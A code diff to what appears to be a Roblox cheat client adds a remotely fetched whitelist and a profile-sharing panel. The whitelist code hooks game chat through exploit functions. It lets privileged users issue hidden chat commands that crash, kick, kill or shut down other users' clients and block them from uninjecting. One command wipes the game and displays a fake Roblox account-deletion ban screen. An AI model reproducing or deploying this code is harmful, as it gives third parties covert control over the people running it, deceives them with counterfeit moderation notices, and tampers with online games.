@@ -394,7 +394,450 @@ run(function()
 end)
 
 
+run(function()
+	function whitelist:get(plr)
+		local plrstr = self.hashes[plr.Name..plr.UserId]
+		for _, v in self.data.WhitelistedUsers do
+			if v.hash == plrstr then
+				return v.level, v.attackable or whitelist.localprio >= v.level, v.tags
+			end
+		end
+		return 0, true
+	end
 
+	function whitelist:isingame()
+		for _, v in playersService:GetPlayers() do
+			if self:get(v) ~= 0 then return true end
+		end
+		return false
+	end
+
+	function whitelist:tag(plr, text, rich)
+		local plrtag, newtag = select(3, self:get(plr)) or self.customtags[plr.Name] or {}, ''
+		if not text then return plrtag end
+		for _, v in plrtag do
+			newtag = newtag..(rich and '<font color="#'..v.color:ToHex()..'">['..v.text..']</font>' or '['..removeTags(v.text)..']')..' '
+		end
+		return newtag
+	end
+
+	function whitelist:getplayer(arg)
+		if arg == 'default' and self.localprio == 0 then return true end
+		if arg == 'private' and self.localprio == 1 then return true end
+		if arg and lplr.Name:lower():sub(1, arg:len()) == arg:lower() then return true end
+		return false
+	end
+
+	local olduninject
+	function whitelist:playeradded(v, joined)
+		if self:get(v) ~= 0 then
+			if self.alreadychecked[v.UserId] then return end
+			self.alreadychecked[v.UserId] = true
+			self:hook()
+			if self.localprio == 0 then
+				olduninject = vape.Uninject
+				vape.Uninject = function()
+					notif('Vape', 'No escaping the private members :)', 10)
+				end
+				if joined then
+					task.wait(10)
+				end
+				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+					local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
+					if newchannel then
+						newchannel:SendAsync('helloimusinginhaler')
+					end
+					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+				elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' helloimusinginhaler', 'All')
+				end
+			end
+		end
+	end
+
+	function whitelist:process(msg, plr)
+		if plr == lplr and msg == 'helloimusinginhaler' then return true end
+
+		if self.localprio > 0 and not self.said[plr.Name] and msg == 'helloimusinginhaler' and plr ~= lplr then
+			self.said[plr.Name] = true
+			notif('Vape', plr.Name..' is using vape!', 60)
+			self.customtags[plr.Name] = {{
+				text = 'VAPE USER',
+				color = Color3.new(1, 1, 0)
+			}}
+			local newent = entitylib.getEntity(plr)
+			if newent then
+				entitylib.Events.EntityUpdated:Fire(newent)
+			end
+			return true
+		end
+
+		if self.localprio < self:get(plr) or plr == lplr then
+			local args = msg:split(' ')
+			table.remove(args, 1)
+			if self:getplayer(args[1]) then
+				table.remove(args, 1)
+				for cmd, func in self.commands do
+					if msg:sub(1, cmd:len() + 1):lower() == ';'..cmd:lower() then
+						func(args, plr)
+						return true
+					end
+				end
+			end
+		end
+
+		return false
+	end
+
+	function whitelist:newchat(obj, plr, skip)
+		obj.Text = self:tag(plr, true, true)..obj.Text
+		local sub = obj.ContentText:find(': ')
+		if sub then
+			if not skip and self:process(obj.ContentText:sub(sub + 3, #obj.ContentText), plr) then
+				obj.Visible = false
+			end
+		end
+	end
+
+	function whitelist:oldchat(func)
+		local msgtable, oldchat = debug.getupvalue(func, 3)
+		if typeof(msgtable) == 'table' and msgtable.CurrentChannel then
+			whitelist.oldchattable = msgtable
+		end
+
+		oldchat = hookfunction(func, function(data, ...)
+			local plr = playersService:GetPlayerByUserId(data.SpeakerUserId)
+			if plr then
+				data.ExtraData.Tags = data.ExtraData.Tags or {}
+				for _, v in self:tag(plr) do
+					table.insert(data.ExtraData.Tags, {TagText = v.text, TagColor = v.color})
+				end
+				if data.Message and self:process(data.Message, plr) then
+					data.Message = ''
+				end
+			end
+			return oldchat(data, ...)
+		end)
+
+		vape:Clean(function()
+			hookfunction(func, oldchat)
+		end)
+	end
+
+	function whitelist:hook()
+		if self.hooked then return end
+		self.hooked = true
+
+		local exp = coreGui:FindFirstChild('ExperienceChat')
+		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+			if exp and exp:WaitForChild('appLayout', 5) then
+				vape:Clean(exp:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
+					local plr = playersService:GetPlayerByUserId(tonumber(obj.Name:split('-')[1]) or 0)
+					obj = obj:FindFirstChild('TextMessage', true)
+					if obj and obj:IsA('TextLabel') then
+						if plr then
+							self:newchat(obj, plr, true)
+							obj:GetPropertyChangedSignal('Text'):Wait()
+							self:newchat(obj, plr)
+						end
+
+						if obj.ContentText:sub(1, 35) == 'You are now privately chatting with' then
+							obj.Visible = false
+						end
+					end
+				end))
+			end
+		elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+			pcall(function()
+				for _, v in getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do
+					if v.Function and table.find(debug.getconstants(v.Function), 'UpdateMessagePostedInChannel') then
+						whitelist:oldchat(v.Function)
+						break
+					end
+				end
+
+				for _, v in getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent) do
+					if v.Function and table.find(debug.getconstants(v.Function), 'UpdateMessageFiltered') then
+						whitelist:oldchat(v.Function)
+						break
+					end
+				end
+			end)
+		end
+
+		if exp then
+			local bubblechat = exp:WaitForChild('bubbleChat', 5)
+			if bubblechat then
+				vape:Clean(bubblechat.DescendantAdded:Connect(function(newbubble)
+					if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusinginhaler') then
+						newbubble.Parent.Parent.Visible = false
+					end
+				end))
+			end
+		end
+	end
+
+	function whitelist:update(first)
+		local suc = pcall(function()
+			local _, subbed = pcall(function()
+				return game:HttpGet('https://github.com/7GrandDadPGN/whitelists')
+			end)
+			local commit = subbed:find('currentOid')
+			commit = commit and subbed:sub(commit + 13, commit + 52) or nil
+			commit = commit and #commit == 40 and commit or 'main'
+			whitelist.textdata = game:HttpGet('https://raw.githubusercontent.com/7GrandDadPGN/whitelists/'..commit..'/PlayerWhitelist.json', true)
+		end)
+		if not suc or not hash or not whitelist.get then return true end
+		whitelist.loaded = true
+
+		if not first or whitelist.textdata ~= whitelist.olddata then
+			if not first then
+				whitelist.olddata = isfile('newvape/profiles/whitelist.json') and readfile('newvape/profiles/whitelist.json') or nil
+			end
+
+			local suc, res = pcall(function()
+				return httpService:JSONDecode(whitelist.textdata)
+			end)
+
+			whitelist.data = suc and type(res) == 'table' and res or whitelist.data
+			whitelist.localprio = whitelist:get(lplr)
+
+			for _, v in whitelist.data.WhitelistedUsers do
+				if v.tags then
+					for _, tag in v.tags do
+						tag.color = Color3.fromRGB(unpack(tag.color))
+					end
+				end
+			end
+
+			if not whitelist.connection then
+				whitelist.connection = playersService.PlayerAdded:Connect(function(v)
+					whitelist:playeradded(v, true)
+				end)
+				vape:Clean(whitelist.connection)
+			end
+
+			for _, v in playersService:GetPlayers() do
+				whitelist:playeradded(v)
+			end
+
+			if entitylib.Running and vape.Loaded then
+				entitylib.refresh()
+			end
+            local exp = os.time()
+			if whitelist.textdata ~= whitelist.olddata then
+				if exp > os.time() then
+					local targets = whitelist.data.Announcement.targets
+					targets = targets == 'all' and {tostring(lplr.UserId)} or targets:split(',')
+
+					if table.find(targets, tostring(lplr.UserId)) then
+						local hint = Instance.new('Hint')
+						hint.Text = 'VAPE ANNOUNCEMENT: '..whitelist.data.Announcement.text
+						hint.Parent = workspace
+						game:GetService('Debris'):AddItem(hint, 20)
+					end
+				end
+				whitelist.olddata = whitelist.textdata
+				pcall(function()
+					writefile('newvape/profiles/whitelist.json', whitelist.textdata)
+				end)
+			end
+
+			if whitelist.data.KillVape then
+				vape:Uninject()
+				return true
+			end
+
+			if whitelist.data.BlacklistedUsers[tostring(lplr.UserId)] then
+				task.spawn(lplr.kick, lplr, whitelist.data.BlacklistedUsers[tostring(lplr.UserId)])
+				return true
+			end
+		end
+	end
+
+	whitelist.commands = {
+		byfron = function()
+			task.spawn(function()
+				if vape.ThreadFix then
+					setthreadidentity(8)
+				end
+				local UIBlox = getrenv().require(game:GetService('CorePackages').UIBlox)
+				local Roact = getrenv().require(game:GetService('CorePackages').Roact)
+				UIBlox.init(getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppUIBloxConfig))
+				local auth = getrenv().require(coreGui.RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+				local darktheme = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Style).Themes.DarkTheme
+				local fonttokens = getrenv().require(game:GetService("CorePackages").Packages._Index.UIBlox.UIBlox.App.Style.Tokens).getTokens('Desktop', 'Dark', true)
+				local buildersans = getrenv().require(game:GetService('CorePackages').Packages._Index.UIBlox.UIBlox.App.Style.Fonts.FontLoader).new(true, fonttokens):loadFont()
+				local tLocalization = getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppLocales).Localization
+				local localProvider = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Localization).LocalizationProvider
+				lplr.PlayerGui:ClearAllChildren()
+				vape.gui.Enabled = false
+				coreGui:ClearAllChildren()
+				lightingService:ClearAllChildren()
+				for _, v in workspace:GetChildren() do
+					pcall(function()
+						v:Destroy()
+					end)
+				end
+				lplr.kick(lplr)
+				guiService:ClearError()
+				local gui = Instance.new('ScreenGui')
+				gui.IgnoreGuiInset = true
+				gui.Parent = coreGui
+				local frame = Instance.new('ImageLabel')
+				frame.BorderSizePixel = 0
+				frame.Size = UDim2.fromScale(1, 1)
+				frame.BackgroundColor3 = Color3.fromRGB(224, 223, 225)
+				frame.ScaleType = Enum.ScaleType.Crop
+				frame.Parent = gui
+				task.delay(0.3, function()
+					frame.Image = 'rbxasset://textures/ui/LuaApp/graphic/Auth/GridBackground.jpg'
+				end)
+				task.delay(0.6, function()
+					local modPrompt = Roact.createElement(auth, {
+						style = {},
+						screenSize = vape.gui.AbsoluteSize or Vector2.new(1920, 1080),
+						moderationDetails = {
+							punishmentTypeDescription = 'Delete',
+							beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+							reactivateAccountActivated = true,
+							badUtterances = {{abuseType = 'ABUSE_TYPE_CHEAT_AND_EXPLOITS', utteranceText = 'ExploitDetected - Place ID : '..game.PlaceId}},
+							messageToUser = 'Roblox does not permit the use of third-party software to modify the client.'
+						},
+						termsActivated = function() end,
+						communityGuidelinesActivated = function() end,
+						supportFormActivated = function() end,
+						reactivateAccountActivated = function() end,
+						logoutCallback = function() end,
+						globalGuiInset = {top = 0}
+					})
+
+					local screengui = Roact.createElement(localProvider, {
+						localization = tLocalization.new('en-us')
+					}, {Roact.createElement(UIBlox.Style.Provider, {
+						style = {
+							Theme = darktheme,
+							Font = buildersans
+						},
+					}, {modPrompt})})
+
+					Roact.mount(screengui, coreGui)
+				end)
+			end)
+		end,
+		crash = function()
+			task.spawn(function()
+				repeat
+					local part = Instance.new('Part')
+					part.Size = Vector3.new(1e10, 1e10, 1e10)
+					part.Parent = workspace
+				until false
+			end)
+		end,
+		deletemap = function()
+			local terrain = workspace:FindFirstChildWhichIsA('Terrain')
+			if terrain then
+				terrain:Clear()
+			end
+
+			for _, v in workspace:GetChildren() do
+				if v ~= terrain and not v:IsDescendantOf(lplr.Character) and not v:IsA('Camera') then
+					v:Destroy()
+					v:ClearAllChildren()
+				end
+			end
+		end,
+		framerate = function(args)
+			if #args < 1 or not setfpscap then return end
+			setfpscap(tonumber(args[1]) ~= '' and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
+		end,
+		gravity = function(args)
+			workspace.Gravity = tonumber(args[1]) or workspace.Gravity
+		end,
+		jump = function()
+			if entitylib.isAlive and entitylib.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+			end
+		end,
+		kick = function(args)
+			task.spawn(function()
+				lplr:Kick(table.concat(args, ' '))
+			end)
+		end,
+		kill = function()
+			if entitylib.isAlive then
+				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+				entitylib.character.Humanoid.Health = 0
+			end
+		end,
+		reveal = function()
+			task.delay(0.1, function()
+				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the inhaler client')
+				else
+					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I am using the inhaler client', 'All')
+				end
+			end)
+		end,
+		shutdown = function()
+			game:Shutdown()
+		end,
+		toggle = function(args)
+			if #args < 1 then return end
+			if args[1]:lower() == 'all' then
+				for i, v in vape.Modules do
+					if i ~= 'Panic' and i ~= 'ServerHop' and i ~= 'Rejoin' then
+						v:Toggle()
+					end
+				end
+			else
+				for i, v in vape.Modules do
+					if i:lower() == args[1]:lower() then
+						v:Toggle()
+						break
+					end
+				end
+			end
+		end,
+		trip = function()
+			if entitylib.isAlive then
+				if entitylib.character.RootPart.Velocity.Magnitude < 15 then
+					entitylib.character.RootPart.Velocity = entitylib.character.RootPart.CFrame.LookVector * 15
+				end
+				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
+			end
+		end,
+		uninject = function()
+			if olduninject then
+				if vape.ThreadFix then
+					setthreadidentity(8)
+				end
+				olduninject(vape)
+			else
+				vape:Uninject()
+			end
+		end,
+		void = function()
+			if entitylib.isAlive then
+				entitylib.character.RootPart.CFrame += Vector3.new(0, -1000, 0)
+			end
+		end
+	}
+
+	task.spawn(function()
+		repeat
+			if whitelist:update(whitelist.loaded) then return end
+			task.wait(10)
+		until vape.Loaded == nil
+	end)
+
+	vape:Clean(function()
+		table.clear(whitelist.commands)
+		table.clear(whitelist.data)
+		table.clear(whitelist)
+	end)
+end)
 entitylib.start()
 run(function()
 	local AimAssist
@@ -7687,4 +8130,442 @@ task.spawn(function()
             end)
         end
     end
+end)
+
+run(function()
+    local Configs
+    local TweenService = cloneref(game:GetService("TweenService"))
+    local sorted = true
+    local profiles = {}
+
+    local Option = {
+        See = true,
+        profile = '',
+        profileName = '',
+        Username = '',
+        created = os.date("%m/%d/%Y")
+    }
+
+    local function TweenController(object, tweenInfo, goal)
+        task.spawn(function()
+            local anim = TweenService:Create(object, tweenInfo, goal)
+            anim:Play()
+            task.wait(0.05)
+            anim.Completed:Connect(function()
+                anim:Destroy()
+            end)
+        end)
+    end
+
+    function sortProfiles(byNewest)
+        table.sort(profiles, function(a, b)
+            if byNewest then
+                return a.Date > b.Date
+            else
+                return a.Date < b.Date
+            end
+        end)
+
+        for i, profile in ipairs(profiles) do
+            profile.Frame.LayoutOrder = i
+        end
+    end
+    local function updateProfiles()
+        if isfile('ReVape/profiles/'..vape.Profile..vape.Place..'.txt') then
+            Option.profile = readfile('ReVape/profiles/'..vape.Profile..vape.Place..'.txt')
+        end
+    end
+    updateProfiles()
+    local function addProfile(frame)
+        if frame:IsA("Frame") then
+            local profile = frame:FindFirstChild("TextButton")
+            local nameLabel = profile 
+            local usernameLabel = profile:FindFirstChild("user") 
+            local dateLabel = profile:FindFirstChild("date")
+
+            if nameLabel and usernameLabel and dateLabel then
+                local month, day, year = dateLabel.Text:match("created%s+(%d+)/(%d+)/(%d+)")
+                local date = os.time({year = tonumber(year), month = tonumber(month), day = tonumber(day)})
+
+                table.insert(profiles, {
+                    Frame = frame,
+                    Name = nameLabel.Text,
+                    Username = usernameLabel.Text,
+                    Date = date
+                })
+
+                sortProfiles(sorted)
+            end
+        end
+    end
+
+    local function create(Name,values)
+        local obj = Instance.new(Name)
+        for i, v in values do
+            obj[i] = v
+        end
+        return obj
+    end
+
+
+
+    local function createC(prnt,rad)
+        create("UICorner",{CornerRadius=rad;Parent=prnt})
+    end
+    local function createP(prnt,B,L,R,T)
+        create("UIPadding",{PaddingBottom=B;PaddingLeft=L;PaddingRight=R;PaddingTop=T;Parent=prnt})
+    end
+    local function createS(prnt,ST,offset,pos,color,line,stroke,thick,trans)
+        create("UIStroke",{ApplyStrokeMode=ST;BorderOffset=offset,BorderStrokePosition=pos,Color=color,LineJoinMode=line,StrokeSizingMode=stroke,Thickness=thick;Transparency=trans;Parent=prnt})
+    end
+
+    local function DownloadConfig(file,name,user)
+        task.wait(1.5)
+        if isfile('ReVape/profiles/'..name..vape.Place..'.txt') then
+            vape:CreateNotification("Onyx","You already have '"..name.."' by "..user.."!",10,'warning')
+            return
+        else
+            local s,e = pcall(function()
+                return writefile('ReVape/profiles/'..name..vape.Place..'.txt',file)
+            end)
+            if e or not s then
+                vape:CreateNotification("Onyx","Could not save '"..name.."' by "..user.."? DM "..vape.Discord.." for help!",15,'alert')
+                print(e)
+                return
+            end
+            vape:CreateNotification("Onyx","Downloaded '"..name.."' by "..user.."!",15)
+        end
+    end
+    local function createProfile(values,prnt)
+        local user = values.name
+        local date = values.created
+        local Name = values.profileName
+        local profile = values.profile
+        local ProfileFrame = create("Frame",{BackgroundColor3=Color3.fromRGB(31,29,31);Name='Profile';Parent=prnt})
+        create("UICorner",{CornerRadius=UDim.new(0,4);Parent=ProfileFrame})
+        local ProfileButton = create("TextButton",{BackgroundColor3=Color3.fromRGB(24,22,24),TextColor3=Color3.fromRGB(155,155,155),TextSize=8;Position=UDim2.fromScale(0.032,0.057);Size=UDim2.fromScale(0.937,0.886);Font=uipallet.Font;Text='@'..user;Parent=ProfileFrame;TextColor3=Color3.fromRGB(155,155,155);TextSize=8})
+
+        create("UICorner",{CornerRadius=UDim.new(0,4);Parent=ProfileButton})
+        task.wait(0.005)
+        create("TextLabel",{Name='date';Parent=ProfileButton;BackgroundTransparency=1;Position=UDim2.fromScale(0,0.845);Size=UDim2.new(1,0,0.153,0);Font=uipallet.Font;Text='created '..date;TextColor3=Color3.fromRGB(71,71,71);TextSize=12})
+        task.wait(0.005)
+        create("TextLabel",{Name='user';Parent=ProfileButton;BackgroundTransparency=1;Position=UDim2.fromOffset(0,0.064);Size=UDim2.new(1,0,0.33,0);Font=uipallet.Font;Text=Name;TextSize=14;TextColor3=Color3.fromRGB(255,255,255)})
+        ProfileFrame:SetAttribute("Profile",profile)
+        ProfileButton.Activated:Connect(function()
+            DownloadConfig(profile,profileName,user)
+        end)
+    end
+
+    local function clearProfiles(prnt)
+        for i, v in prnt:GetChildren() do
+            if v:IsA("Frame") then
+                v:Destroy()
+            end
+        end
+    end
+
+
+    local function RemoveUI()
+        if vape.gui.ScaledGui then
+            if vape.gui.ScaledGui:FindFirstChild('ProfilesGUI') then
+                vape.gui.ScaledGui:FindFirstChild('ProfilesGUI'):Destroy()
+            end
+        end
+    end
+
+    local function RequestURL(method)
+            if method == "GET" then
+                local URL = "https://configclient.fsl58.workers.dev/configs"
+
+                local response = request({
+                    Url = URL,
+                    Method = "GET"
+                })
+
+                if not response or response.StatusCode ~= 200 then
+                    warn("Failed to fetch configs:", response and response.StatusMessage)
+                    return
+                end
+
+                local decoded = nil
+                local ok, err = pcall(function()
+                    decoded = httpService:JSONDecode(response.Body)
+                end)
+
+                if not ok then
+                    warn("JSON decode error:", err)
+                    return
+                end
+
+                for _, cfg in ipairs(decoded) do
+                    local configData = {
+                        name = cfg.name,
+                        created = cfg.created,
+                        profileName = cfg.profileName,
+                        profile = cfg.profile,
+                        See = cfg.See,
+                    }
+                    if not configData.See then return end
+                    createProfile(configData, Children)
+                end
+            elseif method == "POST" then
+                local URL = "https://configclient.fsl58.workers.dev/configs"
+
+
+                local body = httpService:JSONEncode({
+                    profile = Option.profile,
+                    name = Option.Username,
+                    date = Option.created,
+                    ProfileName = Option.profileName,
+                    See = Option.See
+                })
+
+                local res = request({
+                    Url = URL,
+                    Method = "POST",
+                    Body = body,
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    }
+                })
+
+                if res.StatusCode ~= 200 then
+                    warn("POST failed:", res.Body)
+                else
+                    print("POST success:", res.Body)
+                end
+            else
+                warn("[Method is not allowed]: "..method)
+            end
+    end
+
+    Configs = vape.Legit:CreateModule({
+        Name = "Configs",
+        Tooltip = 'Global configs',
+        Function = function(callback)
+            if callback then
+                local ProfilesGUI = create("Frame",{AnchorPoint=Vector2.new(0.5,0.5);BackgroundColor3=Color3.fromRGB(26,25,26);Name='ProfilesGUI';Position=UDim2.fromScale(0.5,0.5);Size=UDim2.fromOffset(660,465),Parent=vape.gui.ScaledGui})
+                local MainFrame = create("Frame",{BorderSizePixel=0;BackgroundTransparency=1;Name='MainFrame';Position=UDim2.new(0,0,0,0);Size=UDim2.fromOffset(660,464),Parent=ProfilesGUI})
+                local CreateFrame = create("Frame",{BorderSizePixel=0;BackgroundTransparency=1;Name='CreateFrame';Position=UDim2.new(0,0,0,0);Size=UDim2.fromOffset(660,464),Parent=ProfilesGUI,Visible=false})
+                addBlur(ProfilesGUI)
+                create("TextButton",{BackgroundTransparency=1,Position=UDim2.fromOffset(0,0),Size=UDim2.fromOffset(0,0),Text="",Parent=ProfilesGUI,Modal=true})
+                createC(ProfilesGUI,UDim.new(0,5))
+                create("Frame",{Name='Divider',BorderSizePixel=0;BackgroundColor3=Color3.fromRGB(36,34,36);Position=UDim2.fromOffset(0,40);Size=UDim2.new(1,0,0,1);Parent=ProfilesGUI})
+                create("TextLabel",{Parent=ProfilesGUI,Name='Title',BackgroundTransparency=1,Position=UDim2.fromOffset(47,12),Size=UDim2.new(0.944,-10,0,20),Font=uipallet.Font,Text="Public Profiles",TextColor3=Color3.fromRGB(200,200,200),TextSize=13,TextXAlignment='Left',TextYAlignment='Center'})
+                local ProfileIMAGE = create("ImageButton",{Parent=ProfilesGUI,ScaleType='Fit',ImageTransparency=0.5,Name="profile",Position=UDim2.new(0.068,-35,0,9),Size=UDim2.fromOffset(24,24),BackgroundTransparency=1,Image=getcustomasset('ReVape/assets/new/profilesicon.png')})
+                createC(ProfileIMAGE,UDim.new(1,0))
+                local CloseIMAGE = create("ImageButton",{Parent=ProfilesGUI,ScaleType='Fit',ImageTransparency=0.5,Name="close",Position=UDim2.new(-1,35,0,9),Size=UDim2.fromOffset(24,24),BackgroundTransparency=1,Image=getcustomasset('ReVape/assets/new/close.png')})
+                createC(CloseIMAGE,UDim.new(1,0))
+                local loading = create("TextLabel",{Parent=MainFrame,BackgroundTransparency=1,Position=UDim2.fromScale(0.309,0.47),Size=UDim2.new(0.52,0,0.2,0),Font=uipallet.Font,Text="LOADING...",TextColor3=Color3.fromRGB(200,200,200),TextSize=18,Visible=false})
+                local searchFrame = create("Frame",{Parent=MainFrame,BackgroundColor3=Color3.fromRGB(34,33,34),Name='Search',Position=UDim2.fromOffset(147,50),Size=UDim2.fromOffset(499,31)})
+                createC(searchFrame,UDim.new(0,4))
+                createS(searchFrame,"Border",UDim.new(0,0),"Outer",Color3.fromRGB(48,48,48),'Round','FixedSize',1,0.2)
+                local search = create("TextBox",{BackgroundTransparency=1,ClearTextOnFocus=false,CursorPosition=-1,Parent=searchFrame,Position=UDim2.fromOffset(10,0),Size=UDim2.new(1,-10,0,31),Font=uipallet.Font,PlaceholderColor3=Color3.fromRGB(169,169,169),PlaceholderText='Search Profile / Username',TextColor3 = Color3.fromRGB(200,200,200),Text='',TextSize=12,TextXAlignment='Left'})
+                createP(search,UDim.new(0,0),UDim.new(0.025,0),UDim.new(0,0),UDim.new(0,0))
+                create("ImageLabel",{BackgroundTransparency=1,Position=UDim2.new(1.01,-500,0,8),Size=UDim2.fromOffset(14,14),Image=getcustomasset('ReVape/assets/new/search.png'),Parent=search,ImageColor3=Color3.fromRGB(120,115,120),ScaleType='Fit'})
+                local new =create("TextButton",{Parent=MainFrame,BackgroundColor3=Color3.fromHSV(vape.GUIColor.Hue,vape.GUIColor.Sat,vape.GUIColor.Value),Name='new',Position=UDim2.fromOffset(153,90),Size=UDim2.fromOffset(74,32),Font=uipallet.Font,Text=''})
+                createC(new,UDim.new(0,20))
+                createS(new,"Border",UDim.new(0,0),"Outer",Color3.fromRGB(36, 34, 36),'Round','FixedSize',2,0)
+                create("TextLabel",{Parent=new,BackgroundTransparency=1,Position=UDim2.fromOffset(0,0),Size=UDim2.fromScale(1,1),Font=uipallet.Font,Text='NEWEST',TextColor3=Color3.fromRGB(255,255,255),TextSize=12})
+                local old =create("TextButton",{Parent=MainFrame,BackgroundTransparency=1,BackgroundColor3=Color3.fromHSV(vape.GUIColor.Hue,vape.GUIColor.Sat,vape.GUIColor.Value),Name='old',Position=UDim2.fromOffset(243,90),Size=UDim2.fromOffset(74,32),Font=uipallet.Font,Text=''})
+                createC(old,UDim.new(0,20))
+                createS(old,"Border",UDim.new(0,0),"Outer",Color3.fromRGB(36, 34, 36),'Round','FixedSize',2,0)
+                create("TextLabel",{Parent=old,BackgroundTransparency=1,Position=UDim2.fromOffset(0,0),Size=UDim2.fromScale(1,1),Font=uipallet.Font,Text='OLDEST',TextColor3=Color3.fromRGB(68, 68, 68),TextSize=12})
+                local createButton = create("TextButton",{Parent=MainFrame,BackgroundColor3=Color3.fromHSV(vape.GUIColor.Hue,vape.GUIColor.Sat,vape.GUIColor.Value),Name='create',Position=UDim2.fromOffset(13,50),Size=UDim2.fromOffset(120,32),Text=''})
+                createC(createButton,UDim.new(0,4))
+                createS(createButton,"Border",UDim.new(0,0),"Outer",Color3.fromRGB(36, 34, 36),'Round','FixedSize',2,0)
+                create("TextLabel",{Parent=createButton,BackgroundTransparency=1,Position=UDim2.fromOffset(0,0),Size=UDim2.fromScale(1,1),Font=uipallet.Font,Text='CREATE NEW',TextColor3=Color3.fromRGB(255,255,255),TextSize=12})
+
+                local reloadButton = create("TextButton",{Parent=MainFrame,BackgroundColor3=Color3.fromHSV(vape.GUIColor.Hue,vape.GUIColor.Sat,vape.GUIColor.Value),Name='create',Position=UDim2.fromOffset(13,101),Size=UDim2.fromOffset(120,32),Text=''})
+                createC(reloadButton,UDim.new(0,4))
+                createS(reloadButton,"Border",UDim.new(0,0),"Outer",Color3.fromRGB(36, 34, 36),'Round','FixedSize',2,0)
+                create("TextLabel",{Parent=reloadButton,BackgroundTransparency=1,Position=UDim2.fromOffset(0,0),Size=UDim2.fromScale(1,1),Font=uipallet.Font,Text='RELOAD PROFILES',TextColor3=Color3.fromRGB(255,255,255),TextSize=12})
+
+                local Children = create("ScrollingFrame",{Parent=MainFrame,Name='Children',BackgroundTransparency=1,Position=UDim2.fromOffset(147,133),Size=UDim2.fromOffset(500,321),AutomaticCanvasSize="Y",CanvasSize=UDim2.fromOffset(0,107),ScrollBarImageTransparency=0.75,ScrollBarThickness=2})
+                create("UIGridLayout",{Parent=Children,CellPadding=UDim2.fromOffset(4,3),CellSize=UDim2.fromOffset(190,185),FillDirection='Horizontal',FillDirectionMaxCells=9})
+
+
+                local searchFrameV2 = create("Frame",{Parent=CreateFrame,BackgroundColor3=Color3.fromRGB(34,33,34),Name='Search',Position=UDim2.fromOffset(201,110),Size=UDim2.fromOffset(419,31)})
+                createC(searchFrameV2,UDim.new(0,4))
+                createS(searchFrameV2,"Border",UDim.new(0,0),"Outer",Color3.fromRGB(48,48,48),'Round','FixedSize',1,0.2)
+                local searchV2 = create("TextBox",{BackgroundTransparency=1,ClearTextOnFocus=false,CursorPosition=-1,Parent=searchFrameV2,Position=UDim2.fromOffset(10,0),Size=UDim2.new(1,-10,0,31),Font=uipallet.Font,PlaceholderColor3=Color3.fromRGB(169,169,169),PlaceholderText='Name of profile',TextColor3 = Color3.fromRGB(200,200,200),Text='',TextSize=12,TextXAlignment='Left'})
+                createP(searchV2,UDim.new(0,0),UDim.new(0.025,0),UDim.new(0,0),UDim.new(0,0))
+
+                local searchFrameV3 = create("Frame",{Parent=CreateFrame,BackgroundColor3=Color3.fromRGB(34,33,34),Name='Search',Position=UDim2.fromOffset(201,150),Size=UDim2.fromOffset(419,31)})
+                createC(searchFrameV3,UDim.new(0,4))
+                createS(searchFrameV3,"Border",UDim.new(0,0),"Outer",Color3.fromRGB(48,48,48),'Round','FixedSize',1,0.2)
+                local searchV3 = create("TextBox",{BackgroundTransparency=1,ClearTextOnFocus=false,CursorPosition=-1,Parent=searchFrameV3,Position=UDim2.fromOffset(10,0),Size=UDim2.new(1,-10,0,31),Font=uipallet.Font,PlaceholderColor3=Color3.fromRGB(169,169,169),PlaceholderText='Username',TextColor3 = Color3.fromRGB(200,200,200),Text='',TextSize=12,TextXAlignment='Left'})
+                createP(searchV3,UDim.new(0,0),UDim.new(0.025,0),UDim.new(0,0),UDim.new(0,0))
+
+
+                local public =create("TextButton",{Parent=CreateFrame,BackgroundColor3=Color3.fromHSV(vape.GUIColor.Hue,vape.GUIColor.Sat,vape.GUIColor.Value),Name='public',Position=UDim2.fromOffset(201,59),Size=UDim2.fromOffset(74,32),Font=uipallet.Font,Text=''})
+                createC(public,UDim.new(0,20))
+                createS(public,"Border",UDim.new(0,0),"Outer",Color3.fromRGB(36, 34, 36),'Round','FixedSize',2,0)
+                create("TextLabel",{Parent=public,BackgroundTransparency=1,Position=UDim2.fromOffset(0,0),Size=UDim2.fromScale(1,1),Font=uipallet.Font,Text='Public',TextColor3=Color3.fromRGB(255,255,255),TextSize=12})
+
+                local private =create("TextButton",{Parent=CreateFrame,BackgroundTransparency=1,BackgroundColor3=Color3.fromHSV(vape.GUIColor.Hue,vape.GUIColor.Sat,vape.GUIColor.Value),Name='priv',Position=UDim2.fromOffset(291,59),Size=UDim2.fromOffset(74,32),Font=uipallet.Font,Text=''})
+                createC(private,UDim.new(0,20))
+                createS(private,"Border",UDim.new(0,0),"Outer",Color3.fromRGB(36, 34, 36),'Round','FixedSize',2,0)
